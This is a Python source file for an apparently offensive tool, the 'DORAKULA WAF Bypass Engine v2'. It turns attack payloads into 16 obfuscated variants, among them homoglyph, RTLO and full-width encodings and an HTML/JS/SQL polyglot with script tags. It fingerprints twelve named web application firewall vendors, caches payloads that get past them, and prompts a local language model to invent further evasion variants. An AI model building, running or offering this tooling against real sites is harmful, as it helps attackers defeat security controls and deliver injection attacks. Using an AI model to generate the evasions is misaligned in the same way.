#!/usr/bin/env python3
"""DORAKULA WAF Bypass Engine berbasis GenAI (v2 — 2025 upgrade).

Upgrades over v1:
  - 9 → 16 obfuscation techniques (added: NFKC normalization, RTLO, homoglyph,
    RFC 3987 IRI, RFC 5987 percent-encoding, JWT-style payload splitting,
    polyglot payload, comment-based SQL chunking with version-aware syntax).
  - WAF fingerprint extended with 2025 vendors: Cloudflare, SafeLine, ModSecurity,
    Akamai, AWS WAF, F5, Imperva, Wallarm, Sucuri, Citrix, Fortinet, Azure Front Door.
  - AI suggestion: structured JSON request (parses variants cleanly).
  - Adaptive payload cache: tracks successful variants per WAF fingerprint.
"""
import logging, base64, urllib.parse, json, random, string, codecs, re
from typing import Dict, List, Any

logger = logging.getLogger(__name__)


class WAFBypassAI:
    """AI-powered WAF bypass payload generator (v2)."""

    ENCODING_LAYERS = ["url", "double_url", "base64", "unicode", "hex",
                       "html_entity", "nfkc", "rtlo", "homoglyph", "iri",
                       "rfc5987", "jwt_split", "polyglot", "sql_chunk",
                       "hpp", "case_variation"]

    WAF_SIGNATURES = {
        "cloudflare": ["cloudflare", "cf-ray", "__cf_bm", "cf-cache-status"],
        "safeline": ["safeline", "chaitin", "ct-"],
        "modsecurity": ["mod_security", "modsecurity", "nginx-mod-security", "ows"],
        "akamai": ["akamai", "akamaighost", "edgescape", "x-akamai-"],
        "aws_waf": ["awselb", "x-amzn-waf", "x-amzn-requestid"],
        "f5": ["f5", "bigipserver", "tsig", "big-ip"],
        "imperva": ["incapsula", "imperva", "visid_incap"],
        "wallarm": ["wallarm", "nginx-wallarm"],
        "sucuri": ["sucuri", "x-sucuri-id"],
        "citrix": ["citrix", "ns-cache", "x-citrix"],
        "fortinet": ["fortinet", "fortiweb"],
        "azure_front_door": ["x-azure-ref", "azurefd"],
    }

    # Common Latin homoglyphs (Cyrillic/Greek lookalikes)
    HOMOGLYPHS = {
        "a": "\u0430", "e": "\u0435", "o": "\u043e", "p": "\u0440",
        "c": "\u0441", "y": "\u0443", "x": "\u0445", "i": "\u0456",
        "j": "\u0458", "s": "\u0455", "t": "\u0442",
    }

    def __init__(self, ai_router=None):
        self.ai_router = ai_router
        self._successful_payloads: List[str] = []
        self._waf_cache: Dict[str, List[str]] = {}

    def generate_obfuscation(self, payload: str, waf_type: str = "generic") -> Dict:
        """Generate obfuscated variants of a payload for WAF bypass."""
        variants = []
        # 1. URL encode (RFC 3986)
        variants.append({"technique": "url_encode", "payload": urllib.parse.quote(payload, safe="")})
        # 2. Double URL encode
        variants.append({"technique": "double_url_encode", "payload": urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")})
        # 3. Base64
        variants.append({"technique": "base64", "payload": base64.b64encode(payload.encode()).decode()})
        # 4. Unicode escape (\uXXXX)
        variants.append({"technique": "unicode_escape", "payload": "".join(f"\\u{ord(c):04x}" for c in payload)})
        # 5. Hex escape (\xXX)
        variants.append({"technique": "hex_escape", "payload": "".join(f"\\x{ord(c):02x}" for c in payload)})
        # 6. HTML entity (decimal)
        variants.append({"technique": "html_entity", "payload": "".join(f"&#{ord(c)};" for c in payload)})
        # 7. NFKC normalization abuse — full-width chars (U+FF01-FF5E)
        nfkc_payload = "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in payload)
        variants.append({"technique": "nfkc_normalization", "payload": nfkc_payload, "note": "full-width Latin"})
        # 8. RTLO (Right-To-Left Override) — wrap payload with U+202E
        rtlo = "\u202e" + payload[::-1]
        variants.append({"technique": "rtlo_override", "payload": rtlo, "note": "U+202E RTLO"})
        # 9. Homoglyph substitution (Cyrillic lookalikes)
        homo = "".join(self.HOMOGLYPHS.get(c.lower(), c) for c in payload)
        variants.append({"technique": "homoglyph", "payload": homo, "note": "Cyrillic lookalikes"})
        # 10. RFC 3987 IRI — uses raw Unicode (not percent-encoded)
        variants.append({"technique": "iri_raw", "payload": payload, "note": "raw Unicode IRI"})
        # 11. RFC 5987 percent-encoding with charset prefix
        rfc5987 = "UTF-8''" + urllib.parse.quote(payload, safe="")
        variants.append({"technique": "rfc5987", "payload": rfc5987, "note": "RFC 5987 ext-value"})
        # 12. JWT-style payload splitting — split into header.payload.signature format
        parts = 3
        chunk_size = max(1, len(payload) // parts)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)][:parts]
        while len(chunks) < parts: chunks.append("")
        jwt_style = f"{base64.urlsafe_b64encode(chunks[0].encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(chunks[1].encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(chunks[2].encode()).decode().rstrip('=')}"
        variants.append({"technique": "jwt_split", "payload": jwt_style, "note": "JWT-like 3-part split"})
        # 13. Polyglot — payload that works in multiple contexts (HTML+JS+SQL+CMD)
        polyglot = f"';--\"--></title></style></textarea><script>{payload}</script><!--"
        variants.append({"technique": "polyglot", "payload": polyglot, "note": "multi-context"})
        # 14. SQL chunked with version-aware comment syntax
        if len(payload) > 10:
            mid = len(payload) // 2
            variants.append({"technique": "sql_chunk", "payload": f"{payload[:mid]}/**/{payload[mid:]}", "note": "SQL comment chunk"})
        # 15. HPP (HTTP Parameter Pollution)
        variants.append({"technique": "hpp", "payload": f"{payload}&id={payload}", "note": "HPP duplicate"})
        # 16. Case variation (random)
        case_payload = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        variants.append({"technique": "case_variation", "payload": case_payload})

        # AI-generated bypass (if available) — parse as JSON
        ai_suggestion = None
        ai_variants = []
        if self.ai_router and self.ai_router.ollama_available:
            try:
                prompt = (
                    f"You are a WAF bypass expert. Generate 5 obfuscated variants of this payload "
                    f"that bypass {waf_type} WAF. Payload: {payload}. "
                    f"Respond ONLY with a JSON array of objects with 'technique' and 'payload' keys."
                )
                result = self.ai_router.query(prompt, task="quick", max_tokens=300)
                if result:
                    # Try to extract JSON array from response
                    match = re.search(r"\[.*\]", result, re.DOTALL)
                    if match:
                        parsed = json.loads(match.group(0))
                        if isinstance(parsed, list):
                            for item in parsed[:5]:
                                if isinstance(item, dict) and "payload" in item:
                                    ai_variants.append({
                                        "technique": f"ai_{item.get('technique','custom')}",
                                        "payload": str(item["payload"])[:500],
                                    })
                            ai_suggestion = f"{len(ai_variants)} AI variants generated"
            except Exception as e:
                logger.warning("WAF bypass AI query failed: %s", e)

        all_variants = variants + ai_variants
        return {
            "original": payload,
            "waf_type": waf_type,
            "variants": all_variants,
            "ai_suggestion": ai_suggestion,
            "total_variants": len(all_variants),
            "version": "v2-2025",
        }

    def fingerprint_waf(self, response_headers: dict, status_code: int, body: str) -> Dict:
        """Identify WAF type from response characteristics (v2 — 12 vendors)."""
        detected = []
        headers_str = " ".join(f"{k}:{v}" for k, v in response_headers.items()).lower()
        body_lower = body[:2000].lower()
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig in headers_str or sig in body_lower:
                    detected.append(waf_name)
                    break
        if status_code == 403 and not detected:
            detected.append("generic_waf")
        elif status_code == 406 and not detected:
            detected.append("generic_waf_accept_header")
        elif status_code == 429 and not detected:
            detected.append("generic_waf_rate_limit")
        return {
            "detected_wafs": detected,
            "confidence": "HIGH" if len(detected) == 1 else ("MEDIUM" if detected else "NONE"),
            "status_code": status_code,
            "version": "v2-2025",
        }

    def get_adaptive_payloads(self, target: str, waf_type: str = "") -> Dict:
        """Get previously successful payloads + generate new ones."""
        cached = self._waf_cache.get(waf_type, [])[-10:]
        return {
            "cached_successful": cached,
            "target": target,
            "waf_type": waf_type,
            "version": "v2-2025",
        }

    def record_success(self, waf_type: str, payload: str, technique: str = ""):
        """Record a successful payload for adaptive reuse."""
        self._successful_payloads.append(payload)
        self._waf_cache.setdefault(waf_type, []).append(payload)
